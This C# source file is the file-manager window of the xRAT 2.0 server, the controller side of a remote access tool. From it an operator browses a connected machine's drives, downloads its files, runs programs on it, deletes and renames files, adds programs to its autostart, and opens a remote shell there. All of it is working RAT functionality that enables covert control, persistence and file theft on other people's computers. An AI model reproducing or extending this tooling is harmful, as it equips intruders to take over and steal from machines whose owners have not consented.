using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using xServer.Core.Commands;
using xServer.Core.Helper;
using xServer.Core.Misc;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmFileManager : Form
    {
        private string _currentDir;
        private readonly Client _connectClient;
        private readonly ListViewColumnSorter _lvwColumnSorter;

        public FrmFileManager(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmFm = this;
            InitializeComponent();

            _lvwColumnSorter = new ListViewColumnSorter();
            lstDirectory.ListViewItemSorter = _lvwColumnSorter;
        }

        private string GetAbsolutePath(string item)
        {
            return Path.GetFullPath(Path.Combine(_currentDir, item));
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = Helper.GetWindowTitle("File Manager", _connectClient);
                new Core.Packets.ServerPackets.GetDrives().Execute(_connectClient);
            }
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmFm = null;
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                if (_connectClient.Value != null)
                {
                    if (_connectClient.Value.LastDirectorySeen)
                    {
                        _currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
                        new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
                        _connectClient.Value.LastDirectorySeen = false;
                    }
                }
            }
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                if (lstDirectory.SelectedItems.Count != 0)
                {
                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && _connectClient.Value != null)
                    {
                        if (lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                        {
                            _currentDir = Path.GetFullPath(Path.Combine(_currentDir, @"..\"));

                            new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
                            _connectClient.Value.LastDirectorySeen = false;
                        }
                        else
                        {
                            if (_connectClient.Value.LastDirectorySeen)
                            {
                                _currentDir = GetAbsolutePath(lstDirectory.SelectedItems[0].SubItems[0].Text);

                                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
                                _connectClient.Value.LastDirectorySeen = false;
                            }
                        }
                    }
                }
            }
        }

        private void ctxtDownload_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    int ID = new Random().Next(0, int.MaxValue) + files.Index;

                    if (_connectClient != null)
                    {
                        new Core.Packets.ServerPackets.DoDownloadFile(path, ID).Execute(_connectClient);

                        this.Invoke((MethodInvoker) delegate
                        {
                            ListViewItem lvi =
                                new ListViewItem(new string[] {ID.ToString(), "Downloading...", files.SubItems[0].Text});
                            lstTransfers.Items.Add(lvi);
                        });
                    }
                }
            }
        }

        private void ctxtExecute_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    if (_connectClient != null)
                        new Core.Packets.ServerPackets.DoProcessStart(path).Execute(_connectClient);
                }
            }
        }

        private void ctxtRename_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.SubItems[0].Text != "..")
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);
                    string newName = files.SubItems[0].Text;
                    bool isDir = files.Tag.ToString() == "dir";

                    if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                    {
                        newName = GetAbsolutePath(newName);

                        if (_connectClient != null)
                            new Core.Packets.ServerPackets.DoPathRename(path, newName, isDir).Execute(_connectClient);
                    }
                }
            }
        }

        private void ctxtDelete_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.SubItems[0].Text != "..")
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);
                    bool isDir = files.Tag.ToString() == "dir";
                    string text = string.Format("Are you sure you want to delete this {0}",
                        (isDir) ? "directory?" : "file?");

                    if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
                        DialogResult.Yes)
                    {
                        if (_connectClient != null)
                            new Core.Packets.ServerPackets.DoPathDelete(path, isDir).Execute(_connectClient);
                    }
                }
            }
        }

        private void ctxtAddToAutostart_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    using (var frm = new FrmAddToAutostart(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            if (_connectClient != null)
                                new Core.Packets.ServerPackets.DoStartupItemAdd(AutostartItem.Name, AutostartItem.Path,
                                    AutostartItem.Type).Execute(_connectClient);
                        }
                    }
                }
            }
        }

        private void ctxtRefresh_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
                _connectClient.Value.LastDirectorySeen = false;
            }
        }

        private void ctxtOpenDirectory_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                string path = _currentDir;
                if (lstDirectory.SelectedItems.Count == 1)
                {
                    var item = lstDirectory.SelectedItems[0];
                    if (item.SubItems[0].Text != ".." && item.Tag.ToString() == "dir")
                    {
                        path = GetAbsolutePath(item.SubItems[0].Text);
                    }
                }

                if (_connectClient.Value.FrmRs != null)
                {
                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
                    _connectClient.Value.FrmRs.Focus();
                }
                else
                {
                    FrmRemoteShell frmRS = new FrmRemoteShell(_connectClient);
                    frmRS.Show();
                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
                }
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(_connectClient.Value.DownloadDirectory))
                Process.Start(_connectClient.Value.DownloadDirectory);
            else
                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
        }

        private void ctxtCancel_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[1].Text.StartsWith("Downloading")) return;
                if (!CommandHandler.CanceledDownloads.ContainsKey(transfer.Index))
                    CommandHandler.CanceledDownloads.Add(int.Parse(transfer.Text), "canceled");
                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoDownloadFileCancel(int.Parse(transfer.Text)).Execute(_connectClient);
                var id = int.Parse(transfer.SubItems[0].Text);
                CommandHandler.RenamedFiles.Remove(id);
                UpdateTransferStatus(transfer.Index, "Canceled", 0);
            }
        }

        public void AddDrives(string[] drives)
        {
            try
            {
                cmbDrives.Invoke((MethodInvoker) delegate
                {
                    cmbDrives.Items.Clear();
                    cmbDrives.Items.AddRange(drives);
                    cmbDrives.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void ClearFileBrowser()
        {
            try
            {
                lstDirectory.Invoke((MethodInvoker)delegate
                {
                    lstDirectory.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void AddItemToFileBrowser(ListViewItem lvi)
        {
            try
            {
                lstDirectory.Invoke((MethodInvoker)delegate
                {
                    lstDirectory.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public int GetTransferIndex(string ID)
        {
            int index = 0;

            try
            {
                lstTransfers.Invoke((MethodInvoker)delegate
                {
                    foreach (ListViewItem lvi in lstTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && ID == lvi.SubItems[0].Text))
                    {
                        index = lvi.Index;
                        break;
                    }
                });
            }
            catch (InvalidOperationException)
            {
                return -1;
            }

            return index;
        }

        public void UpdateTransferStatus(int index, string status, int imageIndex)
        {
            try
            {
                lstTransfers.Invoke((MethodInvoker)delegate
                {
                    lstTransfers.Items[index].SubItems[1].Text = status;
                    if (imageIndex >= 0)
                        lstTransfers.Items[index].ImageIndex = imageIndex;
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == _lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (_lvwColumnSorter.Order == SortOrder.Ascending)
                    _lvwColumnSorter.Order = SortOrder.Descending;
                else
                    _lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                _lvwColumnSorter.SortColumn = e.Column;
                _lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstDirectory.Sort();
        }
    }
}